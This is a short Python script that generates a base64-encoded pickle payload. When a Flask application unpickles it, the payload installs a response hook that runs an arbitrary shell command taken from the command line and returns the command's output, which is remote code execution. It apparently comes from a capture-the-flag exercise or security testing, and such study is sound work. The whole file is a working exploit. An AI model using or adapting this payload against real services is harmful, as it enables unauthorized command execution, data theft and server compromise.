import pickle
import base64
import sys

COMMAND = f"""
from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    from subprocess import check_output
    r = make_response(check_output("{sys.argv[1]}", shell=True))
    return r
"""
class RCE:
    def __reduce__(self):
        return (exec,(COMMAND,))
print(base64.b64encode(pickle.dumps({'name': RCE(), 'activity': 'pwned', 'id': None})).decode())
